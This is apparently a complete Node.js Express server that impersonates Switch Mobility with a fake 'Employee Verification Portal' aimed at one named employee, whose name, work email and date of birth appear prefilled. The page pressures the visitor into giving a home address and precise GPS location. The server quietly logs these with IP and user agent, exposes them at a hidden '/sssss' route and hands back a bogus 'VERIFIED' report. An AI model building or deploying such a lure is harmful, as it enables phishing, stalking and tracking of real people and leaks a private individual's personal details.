const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();
const PORT = 4000;
const SECRET_PATH = "/sssss"; // 🔐 Secret log path
const LOG_FILE = path.join(__dirname, "logs.json");

// Middleware
app.use(bodyParser.json());

// Ensure logs.json exists
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
}

// --- HELPER: SAVE LOGS ---
function saveLog(entry) {
  try {
    const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
    logs.push(entry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
    console.log(`[LOG] Data saved for: ${entry.userData.name}`);
  } catch (err) {
    console.error("Error saving log:", err);
  }
}

// --- ROUTE 1: OFFICIAL SIMULATOR UI ---
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Switch Mobility | Employee Verification Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: #f0f2f5; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            margin: 0; 
        }
        .container { 
            background: white; 
            width: 100%; 
            max-width: 480px; 
            padding: 40px; 
            border-radius: 12px; 
            box-shadow: 0 8px 30px rgba(0,0,0,0.08); 
        }
        
        /* Header & Logo */
        .header { text-align: center; margin-bottom: 30px; }
        .logo { max-width: 180px; margin-bottom: 15px; }
        h2 { color: #111; font-size: 22px; margin: 0; font-weight: 700; }
        p.subtitle { color: #666; font-size: 14px; margin-top: 5px; }

        /* Form Sections */
        .section-title { 
            font-size: 12px; 
            text-transform: uppercase; 
            color: #888; 
            font-weight: 700; 
            margin-bottom: 10px; 
            letter-spacing: 0.5px; 
            border-bottom: 1px solid #eee;
            padding-bottom: 5px;
        }
        
        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: 500; color: #333; margin-bottom: 5px; }
        
        input, textarea { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #ddd; 
            border-radius: 6px; 
            font-size: 14px; 
            box-sizing: border-box; 
            transition: border 0.2s;
            font-family: 'Inter', sans-serif;
        }
        
        /* Read Only Styling */
        input:read-only { 
            background-color: #f8f9fa; 
            color: #555; 
            border-color: #e9ecef; 
            cursor: not-allowed;
        }

        input:focus, textarea:focus { border-color: #0056b3; outline: none; }

        /* GPS Warning Box */
        .gps-box { 
            background-color: #e3f2fd; 
            border-left: 4px solid #2196f3; 
            padding: 12px; 
            margin: 20px 0; 
            font-size: 13px; 
            color: #0d47a1;
            line-height: 1.5;
        }

        /* Button */
        button { 
            width: 100%; 
            padding: 14px; 
            background-color: #0056b3; /* Switch Mobility Blue-ish tone */
            color: white; 
            border: none; 
            border-radius: 6px; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            transition: background 0.2s; 
        }
        button:hover { background-color: #004494; }
        button:disabled { background-color: #ccc; cursor: default; }

        /* Messages */
        #statusMsg { margin-top: 15px; text-align: center; font-size: 14px; }
        .error { color: #d32f2f; font-weight: 500; }
        .success { color: #2e7d32; font-weight: 500; }

        textarea { resize: vertical; min-height: 80px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKlOTa6nQ9IBee3wQutYYddsDsiVMbGqXRhHaYG0Ax&s=10" alt="Switch Mobility" class="logo">
        <h2>Employee Verification</h2>
        <p class="subtitle">Official Work Customer Portal</p>
    </div>

    <div class="section-title">Employee Details (Read-Only)</div>
    
    <div class="form-group">
        <label>Full Name</label>
        <input type="text" id="name" value="Vasu Bawa" readonly>
    </div>
    
    <div class="form-group">
        <label>Email Address</label>
        <input type="text" id="email" value="Vasu.bawa@switchmobilityev.com" readonly>
    </div>

    <div class="form-group">
        <label>Date of Birth</label>
        <input type="text" id="dob" value="26/08/1993" readonly>
    </div>

    <div class="section-title" style="margin-top: 20px;">Current Location Details</div>

    <div class="form-group">
        <label>Current Residential Address</label>
        <textarea id="address" placeholder="Enter House No, Street, Locality..."></textarea>
    </div>

    <div class="form-group">
        <label>Postal Code / Zip Code</label>
        <input type="text" id="zipcode" placeholder="e.g. 122001">
    </div>

    <div class="gps-box">
        <strong>⚠️ GPS Authorization Required</strong><br>
        To complete the verification process, you must <strong>Allow</strong> browser location access when prompted. This is required for residency compliance.
    </div>

    <button id="submitBtn" onclick="handleSubmission()">Download Report and customer interaction feedback</button>
    <div id="statusMsg"></div>
</div>

<script>
    function handleSubmission() {
        const address = document.getElementById('address').value;
        const zip = document.getElementById('zipcode').value;
        const msg = document.getElementById('statusMsg');
        const btn = document.getElementById('submitBtn');

        // 1. Validate Inputs
        if (!address || !zip) {
            msg.className = 'error';
            msg.innerText = "Please enter your Address and Postal Code.";
            return;
        }

        // 2. Prepare UI for GPS Request
        msg.className = '';
        msg.innerText = "Requesting GPS... Check your browser popup.";
        btn.disabled = true;
        btn.innerText = "Waiting for Permission...";

        // 3. Request GPS
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                // SUCCESS: User Clicked "Allow"
                async (position) => {
                    msg.className = 'success';
                    msg.innerText = "Location Verified. Saving Data...";

                    const payload = {
                        name: document.getElementById('name').value,
                        email: document.getElementById('email').value,
                        dob: document.getElementById('dob').value,
                        address: address,
                        zipCode: zip,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };

                    try {
                        // Send data to backend
                        await fetch('/api/submit-verification', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        });

                        // Trigger Download
                        window.location.href = "/download-report";
                        
                        btn.innerText = "Verification Complete";
                        msg.innerText = "Data Saved. Downloading Report...";
                    } catch (e) {
                        msg.className = 'error';
                        msg.innerText = "Server Error. Please try again.";
                        btn.disabled = false;
                    }
                },
                // ERROR: User Clicked "Block" or Error occurred
                (error) => {
                    console.error(error);
                    let errorText = "GPS Error.";
                    if (error.code === 1) {
                        errorText = "❌ You denied the GPS request. Verification failed.";
                    } else if (error.code === 2) {
                        errorText = "❌ GPS Unavailable. Check your device settings.";
                    } else if (error.code === 3) {
                        errorText = "❌ GPS Timeout.";
                    }
                    
                    msg.className = 'error';
                    msg.innerText = errorText;
                    btn.disabled = false;
                    btn.innerText = "Verify Location & Download Report";
                }
            );
        } else {
            msg.className = 'error';
            msg.innerText = "Geolocation not supported by this browser.";
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
  `);
});

// --- ROUTE 2: API TO SAVE DATA ---
app.post("/api/submit-verification", async (req, res) => {
  const { name, email, dob, address, zipCode, latitude, longitude } = req.body;

  // Get IP Info
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
  
  const logEntry = {
    timestamp: new Date().toISOString(),
    userData: {
        name,
        email,
        dob,
        input_address: address,
        input_zip: zipCode
    },
    gps_data: {
        lat: latitude,
        lon: longitude
    },
    network_info: {
        ip: ip,
        userAgent: req.headers["user-agent"]
    }
  };

  saveLog(logEntry);
  res.json({ success: true });
});

// --- ROUTE 3: DOWNLOAD PDF ---
app.get("/download-report", (req, res) => {
  const dummyPdfContent = `
============================================================
   SWITCH MOBILITY - EMPLOYEE VERIFICATION REPORT
============================================================

Date: ${new Date().toLocaleDateString()}
Status: VERIFIED
Employee: Vasu Bawa
ID: SM-88201

LOCATION AUDIT:
------------------------------------------------------------
GPS Coordinates successfully captured and matched against
residential zoning requirements.

Result: PASSED

Welcome to the Switch Mobility Remote Fleet Program.
============================================================
  `;

  res.setHeader("Content-Type", "application/pdf");
  res.setHeader("Content-Disposition", "attachment; filename=Switch_Mobility_Verification.pdf");
  res.send(dummyPdfContent);
});

// --- ROUTE 4: SECRET LOGS ---
app.get(SECRET_PATH, (req, res) => {
  if (fs.existsSync(LOG_FILE)) {
    res.sendFile(LOG_FILE);
  } else {
    res.send("No logs yet.");
  }
});

app.listen(PORT, () => {
  console.log(`Switch Mobility Simulator running on http://localhost:${PORT}`);
});
